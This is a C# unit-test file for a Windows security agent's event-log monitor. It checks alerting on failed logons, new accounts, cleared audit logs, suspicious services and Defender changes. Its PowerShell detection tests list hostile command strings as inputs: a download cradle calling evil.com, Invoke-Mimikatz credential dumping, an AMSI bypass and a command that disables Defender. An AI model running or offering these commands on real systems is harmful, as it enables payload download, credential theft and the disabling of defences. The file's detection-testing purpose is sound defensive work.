using WinSentinel.Agent;
using WinSentinel.Agent.Modules;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Logging.Abstractions;

namespace WinSentinel.Tests.Agent;

public class EventLogMonitorModuleTests
{
    private readonly ThreatLog _threatLog;
    private readonly AgentConfig _config;
    private readonly EventLogMonitorModule _module;

    public EventLogMonitorModuleTests()
    {
        _threatLog = new ThreatLog();
        _config = new AgentConfig { RiskTolerance = RiskTolerance.Medium };
        _module = new EventLogMonitorModule(
            NullLogger<EventLogMonitorModule>.Instance,
            _threatLog,
            _config);
    }

    // ══════════════════════════════════════════
    //  Module Lifecycle
    // ══════════════════════════════════════════

    [Fact]
    public void Name_ReturnsEventLogMonitor()
    {
        Assert.Equal("EventLogMonitor", _module.Name);
    }

    [Fact]
    public void IsActive_InitiallyFalse()
    {
        Assert.False(_module.IsActive);
    }

    // ══════════════════════════════════════════
    //  Security Event: Failed Logon (4625)
    // ══════════════════════════════════════════

    [Fact]
    public void FailedLogon_SingleAttempt_EmitsLowSeverity()
    {
        _module.ProcessSecurityEventData(4625, new Dictionary<string, string>
        {
            ["IpAddress"] = "192.168.1.100",
            ["TargetUserName"] = "admin",
            ["LogonType"] = "3"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Failed Logon Attempt" && t.Severity == ThreatSeverity.Low);
    }

    [Fact]
    public void FailedLogon_BruteForce_EmitsCritical()
    {
        // Simulate 6 failed logons from same source (>5 threshold)
        for (int i = 0; i < 6; i++)
        {
            _module.ProcessSecurityEventData(4625, new Dictionary<string, string>
            {
                ["IpAddress"] = "10.0.0.50",
                ["TargetUserName"] = "admin",
                ["LogonType"] = "3"
            });
        }

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Brute Force Attack Detected" && t.Severity == ThreatSeverity.Critical);
    }

    [Fact]
    public void FailedLogon_DifferentSources_NoBruteForce()
    {
        // 3 from one source, 3 from another — neither should trigger brute force
        for (int i = 0; i < 3; i++)
        {
            _module.ProcessSecurityEventData(4625, new Dictionary<string, string>
            {
                ["IpAddress"] = "10.0.0.1",
                ["TargetUserName"] = "admin"
            });
            _module.ProcessSecurityEventData(4625, new Dictionary<string, string>
            {
                ["IpAddress"] = "10.0.0.2",
                ["TargetUserName"] = "admin"
            });
        }

        var threats = _threatLog.GetAll();
        Assert.DoesNotContain(threats, t => t.Title == "Brute Force Attack Detected");
    }

    [Fact]
    public void FailedLogon_TracksCountPerSource()
    {
        for (int i = 0; i < 3; i++)
        {
            _module.ProcessSecurityEventData(4625, new Dictionary<string, string>
            {
                ["IpAddress"] = "172.16.0.5",
                ["TargetUserName"] = "user1"
            });
        }

        Assert.Equal(3, _module.GetFailedLogonCount("172.16.0.5"));
    }

    // ══════════════════════════════════════════
    //  Security Event: Explicit Credential (4648)
    // ══════════════════════════════════════════

    [Fact]
    public void ExplicitCredentialLogon_EmitsMediumSeverity()
    {
        _module.ProcessSecurityEventData(4648, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "attacker",
            ["TargetUserName"] = "admin",
            ["TargetServerName"] = "DC01"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Explicit Credential Logon" && t.Severity == ThreatSeverity.Medium);
    }

    // ══════════════════════════════════════════
    //  Security Event: Privilege Escalation (4672)
    // ══════════════════════════════════════════

    [Fact]
    public void PrivilegeAssigned_SensitivePrivs_EmitsHigh()
    {
        _module.ProcessSecurityEventData(4672, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "suspicioususer",
            ["PrivilegeList"] = "SeDebugPrivilege\nSeTakeOwnershipPrivilege"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Special Privileges Assigned" && t.Severity == ThreatSeverity.High);
    }

    [Fact]
    public void PrivilegeAssigned_NormalPrivs_EmitsLow()
    {
        _module.ProcessSecurityEventData(4672, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "normaluser",
            ["PrivilegeList"] = "SeChangeNotifyPrivilege"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Special Privileges Assigned" && t.Severity == ThreatSeverity.Low);
    }

    // ══════════════════════════════════════════
    //  Security Event: Account Created (4720)
    // ══════════════════════════════════════════

    [Fact]
    public void AccountCreated_EmitsHighWithFixCommand()
    {
        _module.ProcessSecurityEventData(4720, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "attacker",
            ["TargetUserName"] = "backdoor_user"
        });

        var threats = _threatLog.GetAll();
        var threat = Assert.Single(threats, t => t.Title == "User Account Created");
        Assert.Equal(ThreatSeverity.High, threat.Severity);
        Assert.True(threat.AutoFixable);
        Assert.Contains("backdoor_user", threat.FixCommand!);
    }

    // ══════════════════════════════════════════
    //  Security Event: Group Membership (4732)
    // ══════════════════════════════════════════

    [Fact]
    public void GroupMemberAdded_AdminGroup_EmitsCritical()
    {
        _module.ProcessSecurityEventData(4732, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "attacker",
            ["MemberName"] = "eviluser",
            ["TargetUserName"] = "Administrators"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Member Added to Security Group" && t.Severity == ThreatSeverity.Critical);
    }

    [Fact]
    public void GroupMemberAdded_NonAdminGroup_EmitsHigh()
    {
        _module.ProcessSecurityEventData(4732, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "admin",
            ["MemberName"] = "newuser",
            ["TargetUserName"] = "RemoteDesktopUsers"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Member Added to Security Group" && t.Severity == ThreatSeverity.High);
    }

    // ══════════════════════════════════════════
    //  Security Event: Account Lockout (4740)
    // ══════════════════════════════════════════

    [Fact]
    public void AccountLockout_EmitsMedium()
    {
        _module.ProcessSecurityEventData(4740, new Dictionary<string, string>
        {
            ["TargetUserName"] = "lockeduser"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Account Lockout" && t.Severity == ThreatSeverity.Medium);
    }

    // ══════════════════════════════════════════
    //  Security Event: Audit Log Cleared (1102)
    // ══════════════════════════════════════════

    [Fact]
    public void AuditLogCleared_AlwaysCritical()
    {
        _module.ProcessSecurityEventData(1102, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "attacker"
        });

        var threats = _threatLog.GetAll();
        var threat = Assert.Single(threats, t => t.Title == "Audit Log Cleared");
        Assert.Equal(ThreatSeverity.Critical, threat.Severity);
        Assert.Contains("attacker", threat.Description);
    }

    // ══════════════════════════════════════════
    //  System Event: New Service Installed (7045)
    // ══════════════════════════════════════════

    [Fact]
    public void NewService_NormalPath_EmitsMedium()
    {
        _module.ProcessSystemEventData(7045, new Dictionary<string, string>
        {
            ["ServiceName"] = "LegitService",
            ["ImagePath"] = @"C:\Program Files\App\service.exe"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "New Service Installed" && t.Severity == ThreatSeverity.Medium);
    }

    [Fact]
    public void NewService_SuspiciousPath_EmitsCritical()
    {
        _module.ProcessSystemEventData(7045, new Dictionary<string, string>
        {
            ["ServiceName"] = "EvilService",
            ["ImagePath"] = @"C:\Users\victim\AppData\Local\Temp\evil.exe"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "New Service Installed" && t.Severity == ThreatSeverity.Critical);
    }

    [Fact]
    public void NewService_PowerShellPath_EmitsCritical()
    {
        _module.ProcessSystemEventData(7045, new Dictionary<string, string>
        {
            ["ServiceName"] = "SneakyService",
            ["ImagePath"] = "powershell.exe -enc ABC123"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "New Service Installed" && t.Severity == ThreatSeverity.Critical);
    }

    // ══════════════════════════════════════════
    //  System Event: Unexpected Shutdown (6008)
    // ══════════════════════════════════════════

    [Fact]
    public void UnexpectedShutdown_EmitsHigh()
    {
        _module.ProcessSystemEventData(6008, new Dictionary<string, string>());

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Unexpected System Shutdown" && t.Severity == ThreatSeverity.High);
    }

    // ══════════════════════════════════════════
    //  Defender Event: Malware Detected (1116)
    // ══════════════════════════════════════════

    [Fact]
    public void MalwareDetected_EmitsHighOrAbove()
    {
        _module.ProcessDefenderEventData(1116, new Dictionary<string, string>
        {
            ["ThreatName"] = "Trojan:Win32/Emotet",
            ["Path"] = @"C:\Users\victim\Downloads\invoice.exe"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Malware Detected" && t.Severity >= ThreatSeverity.High);
    }

    // ══════════════════════════════════════════
    //  Defender Event: RTP Disabled (5001)
    // ══════════════════════════════════════════

    [Fact]
    public void DefenderRtpDisabled_EmitsCritical()
    {
        _module.ProcessDefenderEventData(5001, new Dictionary<string, string>());

        var threats = _threatLog.GetAll();
        var threat = Assert.Single(threats, t => t.Title == "Defender Real-Time Protection Disabled");
        Assert.Equal(ThreatSeverity.Critical, threat.Severity);
        Assert.True(threat.AutoFixable);
    }

    [Fact]
    public void DefenderRtpDisabled_SetsCorrelationFlag()
    {
        Assert.False(_module.IsDefenderRtpDisabled);

        _module.ProcessDefenderEventData(5001, new Dictionary<string, string>());

        Assert.True(_module.IsDefenderRtpDisabled);
    }

    // ══════════════════════════════════════════
    //  Correlation: Defender Bypass
    // ══════════════════════════════════════════

    [Fact]
    public void DefenderBypass_RtpDisabledThenServiceInstalled_EmitsCritical()
    {
        // Step 1: Defender RTP disabled
        _module.ProcessDefenderEventData(5001, new Dictionary<string, string>());

        // Step 2: New service installed shortly after
        _module.ProcessSystemEventData(7045, new Dictionary<string, string>
        {
            ["ServiceName"] = "MalwareService",
            ["ImagePath"] = @"C:\Program Files\legitimate.exe"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t =>
            t.Title == "Defender Bypass — Service Installed After RTP Disabled" &&
            t.Severity == ThreatSeverity.Critical);
    }

    [Fact]
    public void DefenderBypass_ServiceWithoutRtpDisabled_NoBypassAlert()
    {
        // Only service installed, no Defender disable
        _module.ProcessSystemEventData(7045, new Dictionary<string, string>
        {
            ["ServiceName"] = "NormalService",
            ["ImagePath"] = @"C:\Program Files\app.exe"
        });

        var threats = _threatLog.GetAll();
        Assert.DoesNotContain(threats, t => t.Title.Contains("Defender Bypass"));
    }

    // ══════════════════════════════════════════
    //  Correlation: Kill Chain Detection
    // ══════════════════════════════════════════

    [Fact]
    public void KillChain_FailedLogonThenSuccessThenEscalation_EmitsCritical()
    {
        // Step 1: Failed logon attempts
        for (int i = 0; i < 3; i++)
        {
            _module.ProcessSecurityEventData(4625, new Dictionary<string, string>
            {
                ["IpAddress"] = "attacker_source",
                ["TargetUserName"] = "admin"
            });
        }

        // Step 2: Explicit credential logon (success after failures) — from same source
        _module.ProcessSecurityEventData(4648, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "attacker_source",
            ["TargetUserName"] = "admin",
            ["TargetServerName"] = "DC01"
        });

        // Step 3: Privilege escalation
        _module.ProcessSecurityEventData(4672, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "admin",
            ["PrivilegeList"] = "SeDebugPrivilege"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t =>
            t.Title == "Kill Chain Detected — Logon → Escalation" &&
            t.Severity == ThreatSeverity.Critical);
    }

    // ══════════════════════════════════════════
    //  PowerShell Script Block Analysis
    // ══════════════════════════════════════════

    [Theory]
    [InlineData("IEX (New-Object Net.WebClient).DownloadString('http://evil.com')", true, "Download cradle")]
    [InlineData("[Convert]::FromBase64String('AAAA')", true, "Base64")]
    [InlineData("Invoke-Mimikatz -DumpCreds", true, "Mimikatz")]
    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true", true, "Defender")]
    [InlineData("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", true, "AMSI")]
    [InlineData("[System.Runtime.InteropServices.Marshal]::VirtualAlloc(0,1024,0x3000,0x40)", true, "memory")]
    [InlineData("Get-ChildItem C:\\Users", false, "")]
    [InlineData("Write-Host 'Hello World'", false, "")]
    public void AnalyzeScriptBlock_DetectsPatterns(string script, bool shouldDetect, string _)
    {
        var (isSuspicious, _, _) = EventLogMonitorModule.AnalyzeScriptBlock(script.ToLowerInvariant());
        Assert.Equal(shouldDetect, isSuspicious);
    }

    [Theory]
    [InlineData("invoke-expression (get-content payload.ps1)", ThreatSeverity.High)]
    [InlineData("(new-object net.webclient).downloadstring('http://evil.com')", ThreatSeverity.Critical)]
    [InlineData("invoke-mimikatz", ThreatSeverity.Critical)]
    [InlineData("[ref].assembly.gettype('system.management.automation.amsiutils')", ThreatSeverity.Critical)]
    [InlineData("virtualalloc", ThreatSeverity.Critical)]
    [InlineData("register-scheduledtask", ThreatSeverity.Medium)]
    public void AnalyzeScriptBlock_CorrectSeverity(string script, ThreatSeverity expectedSeverity)
    {
        var (isSuspicious, _, severity) = EventLogMonitorModule.AnalyzeScriptBlock(script);
        Assert.True(isSuspicious);
        Assert.Equal(expectedSeverity, severity);
    }

    [Fact]
    public void AnalyzeScriptBlock_EncodedCommand_IsCritical()
    {
        var (isSuspicious, _, severity) = EventLogMonitorModule.AnalyzeScriptBlock(
            "powershell -encodedcommand sqbfahga");
        Assert.True(isSuspicious);
        Assert.Equal(ThreatSeverity.Critical, severity);
    }

    [Fact]
    public void AnalyzeScriptBlock_ADRecon_IsMedium()
    {
        var (isSuspicious, _, severity) = EventLogMonitorModule.AnalyzeScriptBlock(
            "get-adcomputer -filter * | select name,operatingsystem");
        Assert.True(isSuspicious);
        Assert.Equal(ThreatSeverity.Medium, severity);
    }

    // ══════════════════════════════════════════
    //  Service Start Type Changed (7040)
    // ══════════════════════════════════════════

    [Fact]
    public void ServiceStartTypeChanged_EmitsLow()
    {
        _module.ProcessSystemEventData(7040, new Dictionary<string, string>
        {
            ["param1"] = "SomeService"
        });

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Service Start Type Changed" && t.Severity == ThreatSeverity.Low);
    }

    // ══════════════════════════════════════════
    //  Rate Limiting
    // ══════════════════════════════════════════

    [Fact]
    public void RateLimit_DuplicateAlertsSuppressed()
    {
        // Same event twice rapidly — second should be suppressed
        _module.ProcessSecurityEventData(4740, new Dictionary<string, string>
        {
            ["TargetUserName"] = "testuser"
        });
        _module.ProcessSecurityEventData(4740, new Dictionary<string, string>
        {
            ["TargetUserName"] = "testuser"
        });

        var threats = _threatLog.GetAll();
        var lockouts = threats.Where(t => t.Title == "Account Lockout").ToList();
        Assert.Single(lockouts);
    }

    [Fact]
    public void AuditLogCleared_NeverRateLimited()
    {
        // Audit log cleared should always emit (forceEmit = true)
        _module.ProcessSecurityEventData(1102, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "attacker"
        });
        _module.ProcessSecurityEventData(1102, new Dictionary<string, string>
        {
            ["SubjectUserName"] = "attacker"
        });

        var threats = _threatLog.GetAll();
        var cleared = threats.Where(t => t.Title == "Audit Log Cleared").ToList();
        Assert.Equal(2, cleared.Count);
    }

    // ══════════════════════════════════════════
    //  Constants
    // ══════════════════════════════════════════

    [Fact]
    public void CorrelationWindow_IsFiveMinutes()
    {
        Assert.Equal(TimeSpan.FromMinutes(5), EventLogMonitorModule.CorrelationWindow);
    }

    [Fact]
    public void BruteForceThreshold_IsFive()
    {
        Assert.Equal(5, EventLogMonitorModule.BruteForceThreshold);
    }
}
